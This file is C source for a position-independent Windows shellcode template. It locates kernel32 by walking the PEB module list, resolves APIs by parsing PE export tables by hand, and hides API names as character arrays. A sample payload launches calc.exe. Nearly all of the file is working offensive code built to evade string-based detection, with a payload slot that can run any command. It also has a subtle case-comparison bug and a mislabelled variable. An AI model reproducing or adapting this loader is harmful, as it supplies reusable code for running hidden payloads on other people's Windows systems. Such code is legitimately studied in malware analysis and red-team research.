#include <windows.h>

typedef FARPROC(WINAPI *Type_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *Type_LoadLibraryA)(LPCSTR);

FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpName);
HMODULE _GetModuleHandle(LPCWSTR lpName);

int mml_stricmpW(const wchar_t *pwsza, const wchar_t *pwszb);
int mml_strcmpA(const char *psza, const char *pszb);

#pragma region shellcode_body

void shellcode_CodeStart() {
	wchar_t wszKernel[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
	HMODULE hKernelModule = _GetModuleHandle(wszKernel);
	if (!hKernelModule)
		return;

	char szGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
	Type_GetProcAddress pfnGetProcAddress = (Type_GetProcAddress)_GetProcAddress(hKernelModule, szGetProcAddress);
	if (!pfnGetProcAddress)
		return;

	char szLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
	Type_LoadLibraryA pfnLoadLibraryA = (Type_LoadLibraryA)pfnGetProcAddress(hKernelModule, szLoadLibraryA);
	if (!pfnLoadLibraryA)
		return;

	// example of execute calc.exe
	typedef HINSTANCE(WINAPI *Type_ShellExecuteA)(__in_opt HWND hwnd, __in_opt LPCSTR lpOperation, __in LPCSTR lpFile, __in_opt LPCSTR lpParameters,
		__in_opt LPCSTR lpDirectory, __in INT nShowCmd);
	char szUser32[] = { 'S', 'h', 'e', 'l', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
	HMODULE hShell32 = (HMODULE)pfnLoadLibraryA(szUser32);
	char szShellExecuteA[] = { 'S', 'h', 'e', 'l', 'l', 'E', 'x', 'e', 'c', 'u', 't', 'e' ,'A', 0 };
	Type_ShellExecuteA pfnShellExecuteA = (Type_ShellExecuteA)pfnGetProcAddress(hShell32, szShellExecuteA);

	char szOpen[] = { 'o', 'p', 'e', 'n', 0 };
	char szCalc[] = { 'c', 'a', 'l', 'c', 0 };
	pfnShellExecuteA(NULL, szOpen, szCalc, NULL, NULL, SW_SHOWNORMAL);
}

#define MakePointer(t, p, offset) ((t)((PBYTE)(p) + offset))
FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpName) {
	if (!hModule || !lpName)
		return NULL;

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS pImageNTHeaders = MakePointer(PIMAGE_NT_HEADERS, hModule, pImageDosHeader->e_lfanew);
	if (pImageNTHeaders->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	if (pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
		return NULL;

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory =
		MakePointer(PIMAGE_EXPORT_DIRECTORY, hModule,
			pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pNameTable = MakePointer(PDWORD, hModule, pImageExportDirectory->AddressOfNames);

	for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
		if (!mml_strcmpA(lpName, (char *)hModule + pNameTable[i])) {
			PWORD pOrdinalTable = MakePointer(PWORD, hModule, pImageExportDirectory->AddressOfNameOrdinals);
			PDWORD pAddressTable = MakePointer(PDWORD, hModule, pImageExportDirectory->AddressOfFunctions);
			DWORD dwAddressOffset = pAddressTable[pOrdinalTable[i]];
			return MakePointer(PVOID, hModule, dwAddressOffset);
		}
	}

	return NULL;
}

HMODULE _GetModuleHandle(LPCWSTR lpName) {
	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR Buffer;
	} UNICODE_STRING;
	typedef UNICODE_STRING *PUNICODE_STRING;
	typedef const UNICODE_STRING *PCUNICODE_STRING;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID BaseAddress;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		SHORT LoadCount;
		SHORT TlsIndex;
		LIST_ENTRY HashTableEntry;
		ULONG TimeDateStamp;
	} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		PVOID SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
	} PEB_LDR_DATA, *PPEB_LDR_DATA;

#ifdef _WIN64
	typedef struct _PEB {
		BYTE Reserved1[2];
		BYTE BeingDebugged;
		BYTE Reserved2[21];
		PPEB_LDR_DATA Ldr;
		PVOID ProcessParameters;
		BYTE Reserved3[520];
		PVOID PostProcessInitRoutine;
		BYTE Reserved4[136];
		ULONG SessionId;
	} PEB, *PPEB;
#else
	typedef struct _PEB {
		BYTE Reserved1[2];
		BYTE BeingDebugged;
		BYTE Reserved2[1];
		PVOID Reserved3[2];
		PPEB_LDR_DATA Ldr;
		LPVOID ProcessParameters;
		PVOID Reserved4[3];
		PVOID AtlThunkSListPtr;
		PVOID Reserved5;
		ULONG Reserved6;
		PVOID Reserved7;
		ULONG Reserved8;
		ULONG AtlThunkSListPtr32;
		PVOID Reserved9[45];
		BYTE Reserved10[96];
		LPVOID PostProcessInitRoutine;
		BYTE Reserved11[128];
		PVOID Reserved12[1];
		ULONG SessionId;
	} PEB, *PPEB;
#endif

	// Get the base address of PEB struct
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
	if (pPeb && pPeb->Ldr) {
		// Get pointer value of PEB_LDR_DATA
		PPEB_LDR_DATA pLdr = pPeb->Ldr;

		// And get header of the InLoadOrderModuleList
		PLIST_ENTRY pHeaderOfModuleList = &(pLdr->InLoadOrderModuleList);
		if (pHeaderOfModuleList->Flink != pHeaderOfModuleList) {
			PLDR_DATA_TABLE_ENTRY pEntry = NULL;
			PLIST_ENTRY pCur = pHeaderOfModuleList->Flink;

			// Find Entry of the fake module
			do {
				pEntry = CONTAINING_RECORD(pCur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
				// OK, got it
				if (0 == mml_stricmpW(pEntry->BaseDllName.Buffer, lpName)) {
					return pEntry->BaseAddress;
					break;
				}
				pEntry = NULL;
				pCur = pCur->Flink;
			} while (pCur != pHeaderOfModuleList);
		}
	}
	return NULL;
}

int mml_stricmpW(const wchar_t *pwsza, const wchar_t *pwszb) {
	unsigned short c1 = 0;
	unsigned short c2 = 0;

	do {
		c1 = (unsigned short)*pwsza++;
		if (c1 >= 65 && c1 <= 90) {
			c1 = c1 + 32;
		}

		c2 = (unsigned short)*pwszb++;
		if (c2 > 65 && c2 < 90) {
			c2 = c2 + 32;
		}

		if (c1 == 0)
			return c1 - c2;
	} while (c1 == c2);

	return c1 - c2;
}

int mml_strcmpA(const char *psza, const char *pszb) {
	unsigned char c1 = 0;
	unsigned char c2 = 0;

	do {
		c1 = (unsigned char)*psza++;
		c2 = (unsigned char)*pszb++;
		if (c1 == 0)
			return c1 - c2;
	} while (c1 == c2);

	return c1 - c2;
}

void shellcode_CodeEnd() {
	return;
}
#pragma endregion shellcode_body
